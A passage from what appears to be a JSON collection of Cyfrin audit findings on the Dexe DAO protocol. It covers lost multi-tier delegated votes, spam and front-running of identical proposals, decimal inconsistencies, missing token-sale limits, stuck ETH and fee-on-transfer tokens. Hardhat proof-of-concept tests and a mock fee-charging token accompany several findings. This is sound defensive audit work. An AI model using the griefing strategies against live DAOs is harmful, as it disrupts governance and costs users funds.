proposal.\n\n3) SECOND_DELEGATOR delegates their 100 votes to FIRST_DELEGATOR. Even though FIRST_DELEGATOR has delegated their votes to FINAL_VOTER, these newly delegated votes don't flow through into FINAL_VOTER hence FINAL_VOTER's total votes is still 200.\n\nAs a user I'd expect that if I delegated my votes to another user who had also delegated their votes, my delegated votes should also flow along with theirs to the final primary voter - otherwise my delegated votes are simply lost.\n\nFollowing PoC to be put in `GovPool.test.js`:\n\n```javascript\n      describe(\"audit tiered revoteDelegate\", () => {\n          // using simple to verify amounts\n          let voteAmount     = wei(\"1000000000000000000\");\n          let totalVotes1Deg = wei(\"2000000000000000000\");\n          let totalVotes2Deg = wei(\"3000000000000000000\");\n          let proposal1Id    = 1;\n\n          let FIRST_DELEGATOR;\n          let SECOND_DELEGATOR;\n          let FINAL_VOTER;\n\n          beforeEach(async () => {\n            FIRST_DELEGATOR  = await accounts(10);\n            SECOND_DELEGATOR = await accounts(11);\n            FINAL_VOTER      = await accounts(12);\n\n            // mint tokens & deposit them to have voting power\n            await token.mint(FIRST_DELEGATOR, voteAmount);\n            await token.approve(userKeeper.address, voteAmount, { from: FIRST_DELEGATOR });\n            await govPool.deposit(FIRST_DELEGATOR, voteAmount, [], { from: FIRST_DELEGATOR });\n            await token.mint(SECOND_DELEGATOR, voteAmount);\n            await token.approve(userKeeper.address, voteAmount, { from: SECOND_DELEGATOR });\n            await govPool.deposit(SECOND_DELEGATOR, voteAmount, [], { from: SECOND_DELEGATOR });\n            await token.mint(FINAL_VOTER, voteAmount);\n            await token.approve(userKeeper.address, voteAmount, { from: FINAL_VOTER });\n            await govPool.deposit(FINAL_VOTER, voteAmount, [], { from: FINAL_VOTER });\n\n            // ensure that delegatedVotingAllowed == false so automatic re-voting\n            // will occur for delegation\n            let defaultSettings = POOL_PARAMETERS.settingsParams.proposalSettings[0];\n            assert.equal(defaultSettings.delegatedVotingAllowed, false);\n\n            // create 1 proposal\n            await govPool.createProposal(\"proposal1\", [[token.address, 0, getBytesApprove(SECOND, 1)]], []);\n\n            // verify delegatedVotingAllowed == false\n            let proposal1 = await getProposalByIndex(proposal1Id);\n            assert.equal(proposal1.core.settings[1], false);\n          });\n\n        it(\"audit testing 3 layer revote delegation\", async () => {\n\n          // FINAL_VOTER votes on proposal\n          await govPool.vote(proposal1Id, true, voteAmount, [], { from: FINAL_VOTER });\n\n          // verify FINAL_VOTER's voting prior to first delegation\n          assert.equal(\n            (await govPool.getUserVotes(proposal1Id, FINAL_VOTER, VoteType.PersonalVote)).totalRawVoted,\n            voteAmount\n          );\n          assert.equal(\n            (await govPool.getUserVotes(proposal1Id, FINAL_VOTER, VoteType.MicropoolVote)).totalRawVoted,\n            \"0\" // nothing delegated to AUDITOR yet\n          );\n          assert.equal(\n            (await govPool.getTotalVotes(proposal1Id, FINAL_VOTER, VoteType.PersonalVote))[0].toFixed(),\n            voteAmount\n          );\n\n          // FIRST_DELEGATOR delegates to FINAL_VOTER, this should cancel FINAL_VOTER's original votes\n          // and re-vote for FINAL_VOTER which will include the delegated votes\n          await govPool.delegate(FINAL_VOTER, voteAmount, [], { from: FIRST_DELEGATOR });\n\n          // verify FINAL_VOTER's voting after first delegation\n          assert.equal(\n            (await govPool.getUserVotes(proposal1Id, FINAL_VOTER, VoteType.PersonalVote)).totalRawVoted,\n            voteAmount // personal votes remain the same\n          );\n          assert.equal(\n            (await govPool.getUserVotes(proposal1Id, FINAL_VOTER, VoteType.MicropoolVote)).totalRawVoted,\n            voteAmount // delegated votes now included\n          );\n          assert.equal(\n            (await govPool.getTotalVotes(proposal1Id, FINAL_VOTER, VoteType.PersonalVote))[0].toFixed(),\n            totalVotes1Deg // delegated votes now included\n          );\n\n          // SECOND_DELEGATOR delegates to FIRST_DELEGATOR. These votes won't carry through into FINAL_VOTER\n          await govPool.delegate(FIRST_DELEGATOR, voteAmount, [], { from: SECOND_DELEGATOR });\n\n          // verify FINAL_VOTER's voting after second delegation\n          assert.equal(\n            (await govPool.getUserVotes(proposal1Id, FINAL_VOTER, VoteType.PersonalVote)).totalRawVoted,\n            voteAmount // personal votes remain the same\n          );\n          assert.equal(\n            (await govPool.getUserVotes(proposal1Id, FINAL_VOTER, VoteType.MicropoolVote)).totalRawVoted,\n            voteAmount // delegated votes remain the same\n          );\n          assert.equal(\n            (await govPool.getTotalVotes(proposal1Id, FINAL_VOTER, VoteType.PersonalVote))[0].toFixed(),\n            totalVotes2Deg // fails here as delegated votes only being counted from the first delegation\n          );\n        });\n      });\n```\n\nRun with: `npx hardhat test --grep \"audit testing 3 layer revote delegation\"`\n\n**Recommended Mitigation:** If `delegatedVotingAllowed == false`, `GovPoolVote::revoteDelegated()` should automatically flow delegated votes through multiple tiers of delegation down to the primary voter. If the project doesn't want to implement this, it should be made clear to users that their delegated votes will have no effect if the address they delegated to also delegates and doesn't vote - many users who come from countries that use Preferential voting systems will naturally expect their votes to flow through multiple layers of delegation.\n\n**Dexe:**\nWe have chosen not to implement this by design; there are many voting systems out there, we prefer explicitness and transparency. Supporting multiple tiers of delegation would increase the system's complexity and introduce DOS attack vectors (for example if a chain of delegations is too large to fit into the block).",
      "summary": "\nThis bug report is about an issue with the DeXe Protocol which is used for DAOs. When a proposal has `delegatedVotingAllowed == false` such that automatic delegation re-voting will occur, delegated votes don't flow through multiple tiers of delegations down to the primary voter. This means that delegated votes are lost and not accounted for. This issue is significant when analyzing voting behavior in established DAOs, as over 50% of delegates across protocols never participate in proposal voting.\n\nTo demonstrate the issue, consider 1 proposal and 3 users: FINAL_VOTER, FIRST_DELEGATOR, SECOND_DELEGATOR where every user has 100 voting power. FIRST_DELEGATOR delegates their 100 votes to FINAL_VOTER, which triggers the automatic cancellation & re-voting of FINAL_VOTER such that FINAL_VOTER has 200 total votes on the proposal. SECOND_DELEGATOR then delegates their 100 votes to FIRST_DELEGATOR, but these delegated votes don't flow through into FINAL_VOTER, meaning their total votes is still 200.\n\nThe recommended mitigation is that if `delegatedVotingAllowed == false`, `GovPoolVote::revoteDelegated()` should automatically flow delegated votes through multiple tiers of delegation down to the primary voter. If the project doesn't want to implement this, it should be made clear to users that their delegated votes will have no effect if the address they delegated to also delegates and doesn't vote.\n\nThe Dexe team has chosen not to implement this by design, as it would increase system complexity and introduce DOS attack vectors.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Dexe",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-11-10-cyfrin-dexe.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian",
        "0kage"
      ]
    },
    {
      "id": "27311",
      "title": "Attacker can spam create identical proposals confusing users as to which is the real proposal to vote on",
      "impact": "MEDIUM",
      "content": "**Description:** If an attacker wants to interfere with the voting on a particular proposal, they can spam create many identical proposals to confuse users as to which is the \"real\" proposal they should vote on. Users will have to decide between which `proposalId` is the real one - why should users trust one unsigned integer over another?\n\n**Impact:** There are 2 possible implications of creating identical-looking fake proposals:\n\n_Vote splitting_: Users will have difficulty figuring out the real proposal from fake ones. As a result, voting may be erroneously distributed to fake proposals instead of being concentrated on the single real proposal. This griefing attack can be executed by anyone simply for the cost of gas and any tokens required to create the proposal being copied.\n\n_Malicious actions_: Creators can camouflage malicious proposal actions by creating similar-looking proposals that are all identical in all aspects except one single malicious proposal action. It is likely that users vote without necessary due diligence.\n\n\n**Proof of Concept:** Consider one variant of this attack that can be 100% automated and highly effective and distributing votes from real to fake proposals. When a create proposal transaction appears in the mempool that the attacker wants to disrupt the attacker can do 1 of 3 strategies with equal probability:\n\n1) front-run - create 2 identical fake proposals before the real one; the real one has the greatest `proposalId`\n2) sandwich - create 2 identical fake proposals on either side of the real proposal; the real one has a `proposalId` value greater than the first fake but smaller then the second fake\n3) back-run - create 2  identical fake proposals after the real one; the real one has the smallest `proposalId`\n\n**Recommended Mitigation:** Consider implementing a 'lock-period' for proposal creators' tokens, adjustable by DAO pools. Alongside a higher minimum token requirement for proposal creation, this can deter duplicate proposals and enhance the DAO's security.\n\n**Dexe:**\nWe already have several protection mechanisms implemented. In order for users to create proposals, they have to deposit a “configurable” amount of tokens into the DAO pool. Users also can't withdraw these tokens in the same block making it impossible to create proposals using flashloans. The proposal creation costs gas which also acts as DOS protection.",
      "summary": "\nThis bug report is about how an attacker can interfere with the voting on a particular proposal by spamming identical proposals. This is known as \"vote splitting\" and can lead to users voting on the wrong proposal or malicious actions being taken. A proof of concept is given on how to automate this process, and a proposed mitigation is to implement a lock-period for proposal creators' tokens. Finally, there are already some protection mechanisms implemented to deter duplicate proposals and enhance the DAO's security.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Dexe",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-11-10-cyfrin-dexe.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian",
        "0kage"
      ]
    },
    {
      "id": "27310",
      "title": "Inconsistent decimal treatment for token amounts across codebase increases security risks for users interacting with Dexe DAO contracts",
      "impact": "MEDIUM",
      "content": "**Description:** Inconsistencies have been identified within the codebase regarding the assumed decimal format for token amounts. Some sections of the codebase assume token amounts to be in their native token decimals, converting them to 18 decimals when needed, while other sections assume all token amounts to be in 18 decimals. This inconsistency poses potential issues\n\n_User Confusion_: Users may find it challenging to determine whether they should provide token amounts in their native token decimals or in 18 decimals, leading to confusion.\n\n_Validation Errors_: In certain scenarios, these inconsistencies could result in incorrect validations. For instance, comparing amounts in different decimal formats could lead to inaccurate results, creating a situation akin to comparing apples to oranges.\n\n_Incorrect Transfers_: There is also the risk of incorrect token transfers due to assumptions about the decimal format. Incorrectly normalised amounts might result in unintended token transfers.\n\nFor eg. when initiating a new token sale proposal via `TokenSaleProposalCreate::createTier`, the function normalises tier parameters: `minAllocationPerUser`, `maxAllocationPerUser`, and `totalTokenProvided` from token decimals to 18 decimals.\n\n`TokenSaleProposalCreate::createTier`\n```solidity\n  function createTier(\n        mapping(uint256 => ITokenSaleProposal.Tier) storage tiers,\n        uint256 newTierId,\n        ITokenSaleProposal.TierInitParams memory _tierInitParams\n    ) external {\n        _validateTierInitParams(_tierInitParams);\n\n        uint256 saleTokenDecimals = _tierInitParams.saleTokenAddress.decimals();\n        uint256 totalTokenProvided = _tierInitParams.totalTokenProvided;\n\n  >      _tierInitParams.minAllocationPerUser = _tierInitParams.minAllocationPerUser.to18(\n            saleTokenDecimals\n        ); //@audit -> normalised to 18 decimals\n   >    _tierInitParams.maxAllocationPerUser = _tierInitParams.maxAllocationPerUser.to18(\n            saleTokenDecimals\n        ); //@audit -> normalised to 18 decimals\n   >     _tierInitParams.totalTokenProvided = totalTokenProvided.to18(saleTokenDecimals); //@audit -> normalised to 18 decimals\n\n        ....\n}\n```\nHowever, when a participant invokes `TokenSalePropsal::buy`, the sale token amount (derived from the purchase token's exchange rate) is assumed to be in 18 decimals. `TokenSaleProposalBuy::getSaleTokenAmount` function compares this amount with the tier minimum & maximum allocations per user.\n\n`TokenSaleProposalBuy::getSaleTokenAmount`\n```solidity\n  function getSaleTokenAmount(\n        ITokenSaleProposal.Tier storage tier,\n        address user,\n        uint256 tierId,\n        address tokenToBuyWith,\n        uint256 amount\n    ) public view returns (uint256) {\n        ITokenSaleProposal.TierInitParams memory tierInitParams = tier.tierInitParams;\n     require(amount > 0, \"TSP: zero amount\");\n        require(canParticipate(tier, tierId, user), \"TSP: cannot participate\");\n        require(\n            tierInitParams.saleStartTime <= block.timestamp &&\n                block.timestamp <= tierInitParams.saleEndTime,\n            \"TSP: cannot buy now\"\n        );\n\n        uint256 exchangeRate = tier.rates[tokenToBuyWith];\n>        uint256 saleTokenAmount = amount.ratio(exchangeRate, PRECISION); //@audit -> this saleTokenAmount is in  saleToken decimals -> unlike in the createTier function, this saleTokenAmount is not normalised to 18 decimals\n\n        require(saleTokenAmount != 0, \"TSP: incorrect token\");\n\n    >     require(\n            tierInitParams.maxAllocationPerUser == 0 ||\n                (tierInitParams.minAllocationPerUser <= saleTokenAmount &&\n                    saleTokenAmount <= tierInitParams.maxAllocationPerUser),\n            \"TSP: wrong allocation\"\n        ); //@audit checks sale token amount is in valid limits\n        require(\n            tier.tierInfo.totalSold + saleTokenAmount <= tierInitParams.totalTokenProvided,\n            \"TSP: insufficient sale token amount\"\n        ); //@audit checks total sold is less than total provided\n}\n```\n\nOther instances where token amounts are assumed to be in token decimals are:\n\n- `TokenSaleProposalCreate::_setParticipationInfo` used to set participation amounts in token sale creation proposal\n- `DistributionProposal::execute` used to execute a reward distribution proposal\n\n\n**Impact:** Inconsistent token amount representation can trigger erroneous validations or wrong transfers.\n\n**Recommended Mitigation:** When handling token amounts in your protocol, it's crucial to adopt a standardised approach for token decimals. Consider following one of below mentioned conventions while handling token decimals:\n\n_Native Token Decimals_: In this convention, each token amount is assumed to be represented in its native token's decimal format. For instance, 100 in USDC represents a token amount of 100 * 10^6, whereas 100 in DAI represents a token amount of 100 * 10^18. In this approach, the protocol takes on the responsibility of ensuring correct token decimal normalisations.\n\n_Fixed 18 Decimals_: Alternatively, you can assume that every token amount passed into any function is always in 18 decimals. However, it places the responsibility on the user to make the necessary token decimal normalisations.\n\nWhile both options are viable, we strongly recommend option 1. It aligns with industry standards, is intuitive, and minimises the potential for user errors. Given that Web3 attracts a diverse range of users, adopting option 1 allows the protocol to proactively handle the necessary conversions, enhancing user experience and reducing the chances of misunderstandings.\n\n**Dexe:**\nFixed in commit [4a4c9d0](https://github.com/dexe-network/DeXe-Protocol/commit/4a4c9d0ee9f9f0a2fcf9d378739dafbbafa5fcf7).\n\n**Cyfrin:** Verified. Dexe has chosen the \"Fixed 18 Decimal\" option where it assumes users send input token amounts in 18 decimals; this was already the default behavior in most of the code. Cyfrin continues to recommend the \"Native Decimal\" option where users call functions with input amounts in the token's native decimal and it is the protocol's responsibility to convert.",
      "summary": "\nThis bug report outlines inconsistencies in the codebase regarding the assumed decimal format for token amounts. In some sections of the codebase, token amounts are assumed to be in their native token decimals, converting them to 18 decimals when needed, while other sections assume all token amounts to be in 18 decimals. This inconsistency can cause user confusion, validation errors, and incorrect token transfers.\n\nThe recommended mitigation is to adopt a standardised approach for token decimals. There are two conventions to choose from: Native Token Decimals and Fixed 18 Decimals. In the former, each token amount is assumed to be represented in its native token's decimal format. This is the recommended approach as it aligns with industry standards, is intuitive, and minimises potential user errors. The latter assumes every token amount passed into any function is always in 18 decimals and places the responsibility on the user to make the necessary token decimal normalisations.\n\nThe fix was implemented by Dexe, who chose the \"Fixed 18 Decimal\" option where it assumes users send input token amounts in 18 decimals. Cyfrin verified the fix, but continues to recommend the \"Native Decimal\" option.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Dexe",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-11-10-cyfrin-dexe.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian",
        "0kage"
      ]
    },
    {
      "id": "27309",
      "title": "Lack of validations on critical Token Sale parameters can allow malicious DAO Pool creators to DOS claims by token sale participants",
      "impact": "MEDIUM",
      "content": "**Description:** When creating a tier, a DAO Pool creator can define custom token sale parameters. These parameters are verified in the `TokenSaleProposalCreate::_validateTierInitParams`. However, this function misses some crucial validations that can potentially deny token sale participants from claiming the DAO tokens they purchased.\n\n1. `TierInitParams::saleEndTime` - An indefinitely long sale duration can deny early token sale participants from claiming within a reasonable time\n2. `TierInitParams::claimLockDuration` - An indefinitely long claim lock duration can deny token sale participants from claiming\n3. `VestingSettings::vestingDuration` - An indefinitely long vesting duration would mean that sale participants will have to wait forever to be fully vested\n4. `VestingSettings::cliffPeriod` - An indefinitely long cliff period will prevent users from claim their vested tokens\n\n\n**Impact:** All the above have a net effect of DOSing legitimate claims of token sale participants\n\n**Recommended Mitigation:** Consider having global variables that enforce reasonable limits for such parameters. Since DAO pool creators can be malicious, the protocol needs to introduce checks that protect the naive/first-time participants.\n\n**Dexe:**\nFixed in commit [440b8b3](https://github.com/dexe-network/DeXe-Protocol/commit/440b8b3534d58d16df781b402503be5a64d5d576) by adding validation of `claimLockDuration <= cliffPeriod` vesting period. Regarding the other suggestions we want to allow DAOs as much freedom as possible; if a DAO decides to create a token sale in 100 years, we don't want to limit them.",
      "summary": "\nA bug was reported in the DeXe Protocol when creating a tier, where custom token sale parameters are not being verified properly. This could potentially deny token sale participants from claiming the DAO tokens they purchased. The bug had four main components: 1) an indefinitely long sale duration, 2) an indefinitely long claim lock duration, 3) an indefinitely long vesting duration, and 4) an indefinitely long cliff period. All of these have a net effect of DOSing legitimate claims of token sale participants.\n\nThe recommended mitigation for this bug was to consider having global variables that enforce reasonable limits for such parameters, in order to protect the naive/first-time participants. The bug was fixed by adding validation of `claimLockDuration <= cliffPeriod` vesting period in commit [440b8b3](https://github.com/dexe-network/DeXe-Protocol/commit/440b8b3534d58d16df781b402503be5a64d5d576). However, the other suggestions were not followed, as the protocol wanted to allow DAOs as much freedom as possible.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Dexe",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-11-10-cyfrin-dexe.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian",
        "0kage"
      ]
    },
    {
      "id": "27308",
      "title": "Distribution proposals simultaneously funded by both ETH and ERC20 tokens results in stuck eth",
      "impact": "MEDIUM",
      "content": "**Description:** [`DistributionProposal::execute()`](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/proposals/DistributionProposal.sol#L49-L69) allows distribution proposals to be simultaneously funded by both eth & erc20 tokens in the same transaction.\n\n**Impact:** When this occurs claiming rewards only releases the erc20 tokens - the eth is permanently stuck in the `DistributionProposal` contract.\n\n**Proof of Concept:** Add the PoC to `test/gov/proposals/DistributionProposal.test.js` under the section `describe(\"claim()\", () => {`:\n```javascript\n      it(\"audit new distribution proposals funded by both eth & erc20 tokens results in stuck eth\", async () => {\n        // DistributionProposal eth balance starts at 0\n        let balanceBefore = toBN(await web3.eth.getBalance(dp.address));\n        assert.equal(balanceBefore, 0);\n\n        // mint reward tokens to sending address\n        await token.mint(govPool.address, wei(\"10\"));\n\n        // use GovPool to create a proposal with 10 wei reward\n        await govPool.createProposal(\n          \"example.com\",\n          [\n            [token.address, 0, getBytesApprove(dp.address, wei(\"10\"))],\n            [dp.address, 0, getBytesDistributionProposal(1, token.address, wei(\"10\"))],\n          ],\n          [],\n          { from: SECOND }\n        );\n\n        // fully fund the proposal using both erc20 token and eth at the same time\n        await impersonate(govPool.address);\n        await token.approve(dp.address, wei(\"10\"), { from: govPool.address });\n        await dp.execute(1, token.address, wei(\"10\"), { value: wei(10), from: govPool.address });\n\n        // only 1 vote so SECOND should get the entire 10 wei reward\n        await govPool.vote(1, true, 0, [1], { from: SECOND });\n\n        // claiming the reward releases the erc20 tokens but the eth remains stuck\n        await dp.claim(SECOND, [1]);\n\n        // DistributionProposal eth balance at 10 wei, reward eth is stuck\n        let balanceAfter = toBN(await web3.eth.getBalance(dp.address));\n        assert.equal(balanceAfter, wei(\"10\"));\n      });\n```\nRun with `npx hardhat test --grep \"audit new distribution proposals funded by both eth & erc20 tokens results in stuck eth\"`\n\n**Recommended Mitigation:** `DistributionProposal::execute()` should revert if `token != ETHEREUM_ADDRESS && msg.value > 0`.\n\nSimilar fixes will need to be made in places where the same issue appears:\n* `TokenSaleProposalBuy::buy()`\n* `TokenSaleProposalWhitelist::lockParticipationTokens()`\n\n**Dexe:**\n\nFixed in commits [5710f31](https://github.com/dexe-network/DeXe-Protocol/commit/5710f31a515b40fab27d55e55adc3df19efca489#diff-9559fcfcd35b0e7d69c24765fb0d5996a7b0b87781860c7f821867c26109814f) & [64bbcf5](https://github.com/dexe-network/DeXe-Protocol/commit/64bbcf5b1575e88ead4e5fd58d8ee210a815aad6).\n\n**Cyfrin:** Verified.",
      "summary": "\nThis bug report is about a function in the DeXe-Protocol called `DistributionProposal::execute()` which allows distribution proposals to be funded by both Ethereum (ETH) and ERC20 tokens in the same transaction. The problem is that when this occurs, claiming rewards only releases the ERC20 tokens, leaving the ETH permanently stuck in the `DistributionProposal` contract. This bug is demonstrated in an example of code added to the `test/gov/proposals/DistributionProposal.test.js` file.\n\nThe recommended mitigation for this bug is to make `DistributionProposal::execute()` revert if the token is not ETHEREUM_ADDRESS and the message value is greater than zero. This fix should also be applied to other places where the same issue appears, such as `TokenSaleProposalBuy::buy()` and `TokenSaleProposalWhitelist::lockParticipationTokens()`.\n\nThe bug has been fixed in two commits, 5710f31 and 64bbcf5. These commits have been verified by Cyfrin.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Dexe",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-11-10-cyfrin-dexe.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian",
        "0kage"
      ]
    },
    {
      "id": "27307",
      "title": "Using fee-on-transfer tokens to fund distribution proposals creates under-funded proposals which causes claiming rewards to revert",
      "impact": "MEDIUM",
      "content": "**Description:** `DistributionProposal::execute()` [L67](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/proposals/DistributionProposal.sol#L67) doesn't account for Fee-On-Transfer tokens but sets `proposal.rewardAmount` to the input `amount` parameter.\n\n**Impact:** Users can't claim their rewards as `DistributionProposal::claim()` will revert since the distribution proposal will be under-funded as the fee-on-transfer token transferred `amount-fee` tokens into the `DistributionProposal` contract.\n\n**Proof of Concept:** First add a new file `mock/tokens/ERC20MockFeeOnTransfer.sol`:\n```solidity\n// Copyright (C) 2017, 2018, 2019, 2020 dbrock, rain, mrchico, d-xo\n// SPDX-License-Identifier: AGPL-3.0-only\n\n// adapted from https://github.com/d-xo/weird-erc20/blob/main/src/TransferFee.sol\n\npragma solidity >=0.6.12;\n\ncontract Math {\n    // --- Math ---\n    function add(uint x, uint y) internal pure returns (uint z) {\n        require((z = x + y) >= x);\n    }\n    function sub(uint x, uint y) internal pure returns (uint z) {\n        require((z = x - y) <= x);\n    }\n}\n\ncontract WeirdERC20 is Math {\n    // --- ERC20 Data ---\n    string  public   name;\n    string  public   symbol;\n    uint8   public   decimals;\n    uint256 public   totalSupply;\n    bool    internal allowMint = true;\n\n    mapping (address => uint)                      public balanceOf;\n    mapping (address => mapping (address => uint)) public allowance;\n\n    event Approval(address indexed src, address indexed guy, uint wad);\n    event Transfer(address indexed src, address indexed dst, uint wad);\n\n    // --- Init ---\n    constructor(string memory _name,\n                string memory _symbol,\n                uint8 _decimalPlaces) public {\n        name     = _name;\n        symbol   = _symbol;\n        decimals = _decimalPlaces;\n    }\n\n    // --- Token ---\n    function transfer(address dst, uint wad) virtual public returns (bool) {\n        return transferFrom(msg.sender, dst, wad);\n    }\n    function transferFrom(address src, address dst, uint wad) virtual public returns (bool) {\n        require(balanceOf[src] >= wad, \"WeirdERC20: insufficient-balance\");\n        if (src != msg.sender && allowance[src][msg.sender] != type(uint).max) {\n            require(allowance[src][msg.sender] >= wad, \"WeirdERC20: insufficient-allowance\");\n            allowance[src][msg.sender] = sub(allowance[src][msg.sender], wad);\n        }\n        balanceOf[src] = sub(balanceOf[src], wad);\n        balanceOf[dst] = add(balanceOf[dst], wad);\n        emit Transfer(src, dst, wad);\n        return true;\n    }\n    function approve(address usr, uint wad) virtual public returns (bool) {\n        allowance[msg.sender][usr] = wad;\n        emit Approval(msg.sender, usr, wad);\n        return true;\n    }\n\n    function mint(address to, uint256 _amount) public {\n        require(allowMint, \"WeirdERC20: minting is off\");\n\n        _mint(to, _amount);\n    }\n\n    function _mint(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"WeirdERC20: mint to the zero address\");\n\n        totalSupply += amount;\n        unchecked {\n            // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.\n            balanceOf[account] += amount;\n        }\n        emit Transfer(address(0), account, amount);\n    }\n\n    function burn(address from, uint256 _amount) public {\n        _burn(from, _amount);\n    }\n\n    function _burn(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"WeirdERC20: burn from the zero address\");\n\n        uint256 accountBalance = balanceOf[account];\n        require(accountBalance >= amount, \"WeirdERC20: burn amount exceeds balance\");\n        unchecked {\n            balanceOf[account] = accountBalance - amount;\n            // Overflow not possible: amount <= accountBalance <= totalSupply.\n            totalSupply -= amount;\n        }\n\n        emit Transfer(account, address(0), amount);\n    }\n\n    function toggleMint() public {\n        allowMint = !allowMint;\n    }\n}\n\ncontract ERC20MockFeeOnTransfer is WeirdERC20 {\n\n    uint private fee;\n\n    // --- Init ---\n    constructor(string memory _name,\n                string memory _symbol,\n                uint8 _decimalPlaces,\n                uint _fee) WeirdERC20(_name, _symbol, _decimalPlaces) {\n        fee = _fee;\n    }\n\n    // --- Token ---\n    function transferFrom(address src, address dst, uint wad) override public returns (bool) {\n        require(balanceOf[src] >= wad, \"ERC20MockFeeOnTransfer: insufficient-balance\");\n        // don't worry about allowances for this mock\n        //if (src != msg.sender && allowance[src][msg.sender] != type(uint).max) {\n        //    require(allowance[src][msg.sender] >= wad, \"ERC20MockFeeOnTransfer insufficient-allowance\");\n        //    allowance[src][msg.sender] = sub(allowance[src][msg.sender], wad);\n        //}\n\n        balanceOf[src] = sub(balanceOf[src], wad);\n        balanceOf[dst] = add(balanceOf[dst], sub(wad, fee));\n        balanceOf[address(0)] = add(balanceOf[address(0)], fee);\n\n        emit Transfer(src, dst, sub(wad, fee));\n        emit Transfer(src, address(0), fee);\n\n        return true;\n    }\n}\n```\n\nThen change  `test/gov/proposals/DistributionProposal.test.js` to:\n\n* add new line L24 `const ERC20MockFeeOnTransfer = artifacts.require(\"ERC20MockFeeOnTransfer\");`\n* add new line L51 `ERC20MockFeeOnTransfer.numberFormat = \"BigNumber\";`\n* Add this PoC under the section `describe(\"claim()\", () => {`:\n```javascript\n      it(\"using fee-on-transfer tokens to fund distribution proposals prevents claiming rewards\", async () => {\n        // create fee-on-transfer token with 1 wei transfer fee\n        // this token also doesn't implement approvals so don't need to worry about that\n        let feeOnTransferToken\n          = await ERC20MockFeeOnTransfer.new(\"MockFeeOnTransfer\", \"MockFeeOnTransfer\", 18, wei(\"1\"));\n\n        // mint reward tokens to sending address\n        await feeOnTransferToken.mint(govPool.address, wei(\"10\"));\n\n        // use GovPool to create a proposal with 10 wei reward\n        await govPool.createProposal(\n          \"example.com\",\n          [\n            [feeOnTransferToken.address, 0, getBytesApprove(dp.address, wei(\"10\"))],\n            [dp.address, 0, getBytesDistributionProposal(1, feeOnTransferToken.address, wei(\"10\"))],\n          ],\n          [],\n          { from: SECOND }\n        );\n\n        // attempt to fully fund the proposal using the fee-on-transfer reward token\n        await impersonate(govPool.address);\n        await dp.execute(1, feeOnTransferToken.address, wei(\"10\"), { from: govPool.address });\n\n        // only 1 vote so SECOND should get the entire 10 wei reward\n        await govPool.vote(1, true, 0, [1], { from: SECOND });\n\n        // attempting to claim the reward fails as the proposal is under-funded\n        // due to the fee-on-transfer token transferring less into the DistributionProposal\n        // contract than the inputted amount\n        await truffleAssert.reverts(dp.claim(SECOND, [1]), \"Gov: insufficient funds\");\n      });\n```\n\nRun with `npx hardhat test --grep \"fee-on-transfer\"`\n\n**Recommended Mitigation:** Consider one of the two options:\n\n1. Don't support the fee-on-transfer tokens for the current version. Mention clearly on the website, official documentation that such tokens should not be used by DAO pools, both as governance tokens or sale tokens.\n\n2. If fee-on-transfer tokens are to be supported, `DistributionProposal::execute()` should:\n* check the contract's current erc20 balance for the reward token,\n* transfer in the erc20 tokens,\n* calculate actual change in the contract's balance for the reward token and set that as the reward amount.\n\nOther places that may require similar fixes to support Fee-On-Transfer tokens:\n* `TokenSaleProposalWhitelist::lockParticipationTokens()`\n* `GovUserKeeper::depositTokens()`\n* `GovPool::delegateTreasury()`\n\nRecommend the project add comprehensive unit & integration tests exercising all functionality of the system using Fee-On-Transfer tokens. Also recommend project consider whether it wants to support Rebasing tokens and implement similar unit tests for Rebasing tokens. If the project no longer wishes to support Fee-On-Transfer tokens this should be made clear to users.\n\n**Dexe:**\nWe will not support fee-on-transfer tokens throughout the system. There are many internal transfers of tokens between contracts during the flow; supporting fee-on-transfer tokens will result in bad UX and huge commissions for the end users.",
      "summary": "\nThis bug report is about `DistributionProposal::execute()` [L67](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/proposals/DistributionProposal.sol#L67) not accounting for Fee-On-Transfer tokens. This means that users are unable to claim their rewards as the distribution proposal will be under-funded. A proof of concept was provided to demonstrate the issue.\n\nThe recommended mitigation for this issue is to either not support fee-on-transfer tokens or if they are to be supported, `DistributionProposal::execute()` should check the contract's current erc20 balance for the reward token, transfer in the erc20 tokens, and calculate actual change in the contract's balance for the reward token and set that as the reward amount. It was also recommended that comprehensive unit and integration tests be added to exercise all functionality of the system using Fee-On-Transfer tokens.\n\nIn response, DeXe has decided not to support fee-on-transfer tokens throughout the system as it would result in bad user experience and huge commissions for the end users.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Dexe",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-11-10-cyfrin-dexe.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian",
        "0kage"
      ]
    },
    {
      "id": "27306",
      "title": "Use `ERC721::_safeMint()` instead of `_mint()`",
